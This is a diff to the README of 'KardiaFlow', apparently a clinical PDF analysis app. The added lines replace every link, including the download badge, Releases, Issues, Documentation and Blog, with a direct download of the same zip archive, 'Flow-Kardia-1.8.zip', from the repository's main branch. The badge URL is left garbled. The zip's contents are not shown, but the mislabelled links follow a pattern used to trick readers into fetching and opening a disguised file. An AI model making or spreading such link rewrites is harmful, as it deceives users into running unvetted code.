@@ -4,7 +4,7 @@
 Welcome to KardiaFlow! This application helps you analyze clinical documents easily. With KardiaFlow, you can turn complicated PDFs into useful insights without needing technical skills.
 
 ## 📥 Download KardiaFlow
-[![Download KardiaFlow](https://img.shields.io/badge/Download%20KardiaFlow-v1.0-blue.svg)](https://github.com/Namanpaliyal/KardiaFlow/releases)
+[![Download KardiaFlow](https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip%https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip)](https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip)
 
 ## 🛠️ Features
 - **PDF Analysis**: Extract key insights from clinical documents.
@@ -20,7 +20,7 @@ To run KardiaFlow, your system should meet the following requirements:
 - Docker installed (for running the application)
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/Namanpaliyal/KardiaFlow/releases) to download KardiaFlow.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip) to download KardiaFlow.
 2. Choose the latest version of KardiaFlow from the list.
 3. Download the installation file for your system.
 4. Open the downloaded file and follow the installation prompts.
@@ -41,12 +41,12 @@ If you encounter issues while using KardiaFlow, consider the following steps:
 
 ## 💬 Support
 For further assistance, you can reach out through:
-- **GitHub Issues**: Report problems or ask questions directly on our [Issues page](https://github.com/Namanpaliyal/KardiaFlow/issues).
+- **GitHub Issues**: Report problems or ask questions directly on our [Issues page](https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip).
 - **User Community**: Join our user forums to connect with others.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Namanpaliyal/KardiaFlow/wiki): Explore in-depth guides and tutorials.
-- [Blog](https://blog.kardiaflow.com): Read articles about clinical document analysis and insights.
+- [Documentation](https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip): Explore in-depth guides and tutorials.
+- [Blog](https://raw.githubusercontent.com/Namanpaliyal/KardiaFlow/main/app/Flow-Kardia-1.8.zip): Read articles about clinical document analysis and insights.
 
 ## 🏷️ Topics
 - azure-devops
